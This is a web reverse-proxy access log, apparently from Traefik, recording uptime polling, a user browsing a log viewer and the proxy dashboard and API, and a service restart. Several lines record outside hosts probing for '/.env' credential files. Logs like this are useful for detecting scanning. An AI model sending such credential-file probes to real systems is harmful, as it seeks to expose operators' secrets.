209.141.60.74 - - [20/Dec/2023:02:15:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11956 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11957 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11958 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11959 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11960 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11961 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:17:21 +0000] "GET /logs/ HTTP/2.0" 200 2472 "-" "-" 11962 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:17:21 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 11963 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:17:21 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2437 "-" "-" 11964 "www@docker" "http://172.18.0.9:80" 164ms
173.48.140.140 - - [20/Dec/2023:02:17:26 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2492 "-" "-" 11965 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [20/Dec/2023:02:17:27 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2346 "-" "-" 11966 "www@docker" "http://172.18.0.9:80" 22ms
173.48.140.140 - - [20/Dec/2023:02:17:33 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2350 "-" "-" 11967 "www@docker" "http://172.18.0.9:80" 33ms
167.71.120.76 - - [20/Dec/2023:02:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11968 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:17:34 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2350 "-" "-" 11969 "www@docker" "http://172.18.0.9:80" 33ms
173.48.140.140 - - [20/Dec/2023:02:17:36 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2345 "-" "-" 11970 "www@docker" "http://172.18.0.9:80" 38ms
159.203.109.206 - - [20/Dec/2023:02:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11971 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11972 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11973 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11974 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11975 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11976 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11977 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [20/Dec/2023:02:21:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11978 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:02:21:29 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11979 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11980 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11981 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11982 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11983 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11984 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:02:24:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11985 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11986 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11987 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11988 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11989 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11990 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11991 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11992 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11993 "www@docker" "http://172.18.0.9:80" 1ms
54.36.115.221 - - [20/Dec/2023:02:28:13 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11994 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:02:28:13 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11995 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11996 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11997 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11998 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11999 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12000 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12001 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12002 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12003 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12004 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1 "www@docker" "http://172.19.0.9:80" 84ms
173.48.140.140 - - [20/Dec/2023:02:41:27 +0000] "GET /logs/ HTTP/1.1" 301 17 "-" "-" 2 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:41:27 +0000] "GET /logs/ HTTP/2.0" 404 146 "-" "-" 3 "log-pager@docker" "http://172.19.0.4:80" 15ms
167.71.120.76 - - [20/Dec/2023:02:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4 "www@docker" "http://172.19.0.9:80" 21ms
173.48.140.140 - - [20/Dec/2023:02:41:35 +0000] "GET /log/ HTTP/2.0" 404 153 "-" "-" 5 "www@docker" "http://172.19.0.9:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:41:39 +0000] "GET /logs HTTP/2.0" 404 146 "-" "-" 6 "log-pager@docker" "http://172.19.0.4:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:00 +0000] "GET /trace/ HTTP/2.0" 404 153 "-" "-" 7 "www@docker" "http://172.19.0.9:80" 21ms
173.48.140.140 - - [20/Dec/2023:02:42:03 +0000] "GET /trace HTTP/2.0" 404 153 "-" "-" 8 "www@docker" "http://172.19.0.9:80" 1ms
68.69.186.30 - - [20/Dec/2023:02:42:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10 "www@docker" "http://172.19.0.9:80" 15ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 11 "dashboard@internal" "-" 3ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/app.ccc19229.js HTTP/1.1" 200 40731 "-" "-" 13 "dashboard@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/runtime.f8368add.js HTTP/1.1" 200 4057 "-" "-" 14 "dashboard@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/app.3d2d5994.css HTTP/1.1" 200 204768 "-" "-" 12 "dashboard@internal" "-" 32ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/vendor.f60bcb86.js HTTP/1.1" 200 506585 "-" "-" 15 "dashboard@internal" "-" 52ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/76baf610.0962c6be.css HTTP/1.1" 200 867 "-" "-" 16 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/76baf610.7509c35c.js HTTP/1.1" 200 19325 "-" "-" 17 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/11f98cd8.02647ec3.css HTTP/1.1" 200 3153 "-" "-" 18 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/11f98cd8.e511840d.js HTTP/1.1" 200 463285 "-" "-" 19 "dashboard@internal" "-" 54ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/nunito-v11-latin-regular.de6068bf.woff2 HTTP/1.1" 200 19976 "-" "-" 20 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/Eva-Icons.5073ed91.woff2 HTTP/1.1" 200 25896 "-" "-" 21 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/nunito-v11-latin-600.b10ecee2.woff2 HTTP/1.1" 200 20084 "-" "-" 22 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/flUhRq6tzZclQEJ-Vdg-IuiaDsNcIhQ8tQ.0509ab09.woff2 HTTP/1.1" 200 60840 "-" "-" 23 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/nunito-v11-latin-700.91ae827a.woff2 HTTP/1.1" 200 20128 "-" "-" 24 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /api/version HTTP/1.1" 200 91 "-" "-" 25 "api@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /api/entrypoints HTTP/1.1" 200 767 "-" "-" 26 "api@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 27 "api@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/11f98cd8.02647ec3.css HTTP/1.1" 200 3153 "-" "-" 28 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/29ab06d1.ec33fe24.css HTTP/1.1" 200 7001 "-" "-" 29 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/067758be.3de973dd.css HTTP/1.1" 200 1027 "-" "-" 30 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/041f4ca8.f6e3d404.css HTTP/1.1" 200 662 "-" "-" 31 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/09354cb8.0e433876.css HTTP/1.1" 200 0 "-" "-" 32 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/3e3ce03c.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 33 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/46fd955e.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 34 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/76baf610.0962c6be.css HTTP/1.1" 200 867 "-" "-" 35 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/52875482.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 36 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/4d42dcea.3856608f.css HTTP/1.1" 200 3201 "-" "-" 37 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/491024e9.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 38 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/6d73c73c.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 39 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/797e4f23.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 40 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/77d911b4.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 41 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/b34404c8.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 42 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/041f4ca8.4f70d06d.js HTTP/1.1" 200 3067 "-" "-" 43 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/067758be.c7890581.js HTTP/1.1" 200 11437 "-" "-" 44 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/css/e036c7dc.1666b9a0.css HTTP/1.1" 200 2871 "-" "-" 45 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/09354cb8.2e39e534.js HTTP/1.1" 200 4824 "-" "-" 47 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/29ab06d1.8f1fa71a.js HTTP/1.1" 200 28499 "-" "-" 48 "dashboard@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/2d21e8fd.c00ac0e6.js HTTP/1.1" 200 701 "-" "-" 49 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/3e3ce03c.293f4729.js HTTP/1.1" 200 6859 "-" "-" 50 "dashboard@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/46fd955e.343a8488.js HTTP/1.1" 200 6868 "-" "-" 51 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/11f98cd8.e511840d.js HTTP/1.1" 200 390392 "-" "-" 46 "dashboard@internal" "-" 22ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/491024e9.5ba4955c.js HTTP/1.1" 200 6856 "-" "-" 52 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/4d42dcea.18f43827.js HTTP/1.1" 200 39952 "-" "-" 53 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/52875482.65e645a6.js HTTP/1.1" 200 6873 "-" "-" 54 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/77d911b4.8d5002b7.js HTTP/1.1" 200 6870 "-" "-" 55 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/76baf610.7509c35c.js HTTP/1.1" 200 19325 "-" "-" 56 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/6d73c73c.d8a27bbb.js HTTP/1.1" 200 6856 "-" "-" 57 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/797e4f23.771f63ae.js HTTP/1.1" 200 6912 "-" "-" 58 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/b34404c8.7a4b9be8.js HTTP/1.1" 200 6917 "-" "-" 59 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/js/e036c7dc.5d7ae0bf.js HTTP/1.1" 200 17184 "-" "-" 60 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:29 +0000] "GET /dashboard/fonts/KFOlCnqEu92Fr1MmYUtfBBc-.bb1e4dc6.woff HTTP/1.1" 200 20392 "-" "-" 61 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:30 +0000] "GET /dashboard/statics/providers/file.svg HTTP/1.1" 200 644 "-" "-" 62 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:30 +0000] "GET /dashboard/statics/providers/docker.svg HTTP/1.1" 200 1808 "-" "-" 63 "dashboard@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 64 "www@docker" "http://172.19.0.9:80" 24ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/js/3e3ce03c.293f4729.js HTTP/1.1" 200 6859 "-" "-" 65 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/css/3e3ce03c.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 66 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/css/041f4ca8.f6e3d404.css HTTP/1.1" 200 662 "-" "-" 67 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/css/067758be.3de973dd.css HTTP/1.1" 200 1027 "-" "-" 68 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/js/067758be.c7890581.js HTTP/1.1" 200 11437 "-" "-" 69 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/js/041f4ca8.4f70d06d.js HTTP/1.1" 200 3067 "-" "-" 70 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=1 HTTP/1.1" 200 2376 "-" "-" 71 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 72 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /dashboard/statics/providers/internal.svg HTTP/1.1" 200 3681 "-" "-" 73 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=2 HTTP/1.1" 200 554 "-" "-" 74 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:34 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=3 HTTP/1.1" 400 53 "-" "-" 75 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:39 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 76 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:39 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 2928 "-" "-" 77 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:44 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 78 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:44 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 2928 "-" "-" 79 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:49 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 80 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:49 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 2928 "-" "-" 81 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:54 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 82 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:54 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 2928 "-" "-" 83 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /dashboard/js/4d42dcea.18f43827.js HTTP/1.1" 200 39952 "-" "-" 84 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /dashboard/css/4d42dcea.3856608f.css HTTP/1.1" 200 3201 "-" "-" 85 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /dashboard/css/e036c7dc.1666b9a0.css HTTP/1.1" 200 2871 "-" "-" 86 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /dashboard/js/e036c7dc.5d7ae0bf.js HTTP/1.1" 200 17184 "-" "-" 87 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /api/http/routers/db-costack@docker HTTP/1.1" 200 181 "-" "-" 88 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /api/entrypoints/websecure HTTP/1.1" 200 223 "-" "-" 89 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:55 +0000] "GET /api/entrypoints/web HTTP/1.1" 200 320 "-" "-" 90 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:42:59 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 91 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:00 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=1 HTTP/1.1" 200 2376 "-" "-" 92 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:00 +0000] "GET /api/http/routers?search=&status=&per_page=12&page=1 HTTP/1.1" 200 2928 "-" "-" 93 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:00 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=1 HTTP/1.1" 200 2376 "-" "-" 94 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:00 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=2 HTTP/1.1" 200 554 "-" "-" 95 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:01 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=3 HTTP/1.1" 400 53 "-" "-" 96 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:03 +0000] "GET /api/http/routers/log-pager@docker HTTP/1.1" 200 287 "-" "-" 97 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:03 +0000] "GET /api/entrypoints/websecure HTTP/1.1" 200 223 "-" "-" 98 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:03 +0000] "GET /api/entrypoints/web HTTP/1.1" 200 320 "-" "-" 99 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:04 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 100 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:09 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 101 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:14 +0000] "GET /logs HTTP/2.0" 404 146 "-" "-" 102 "log-pager@docker" "http://172.19.0.4:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:43:15 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 103 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:18 +0000] "GET /logs/ HTTP/2.0" 404 146 "-" "-" 104 "log-pager@docker" "http://172.19.0.4:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 105 "www@docker" "http://172.19.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:43:20 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 106 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:43:25 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 107 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:40 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 1 "api@internal" "-" 16ms
173.48.140.140 - - [20/Dec/2023:02:44:45 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 2 "api@internal" "-" 2ms
173.48.140.140 - - [20/Dec/2023:02:44:49 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 4 "api@internal" "-" 4ms
173.48.140.140 - - [20/Dec/2023:02:44:49 +0000] "GET /api/entrypoints HTTP/1.1" 200 767 "-" "-" 3 "api@internal" "-" 16ms
173.48.140.140 - - [20/Dec/2023:02:44:49 +0000] "GET /dashboard/statics/providers/file.svg HTTP/1.1" 200 644 "-" "-" 5 "dashboard@internal" "-" 5ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 6 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/http/routers?search=&status=&per_page=12&page=1 HTTP/1.1" 200 3111 "-" "-" 7 "api@internal" "-" 5ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=1 HTTP/1.1" 200 2559 "-" "-" 8 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /dashboard/statics/providers/internal.svg HTTP/1.1" 200 3681 "-" "-" 9 "dashboard@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=1 HTTP/1.1" 200 2559 "-" "-" 10 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=2 HTTP/1.1" 200 554 "-" "-" 11 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:52 +0000] "GET /api/http/routers?search=&status=&per_page=10&page=3 HTTP/1.1" 400 53 "-" "-" 12 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:44:57 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 13 "api@internal" "-" 0ms
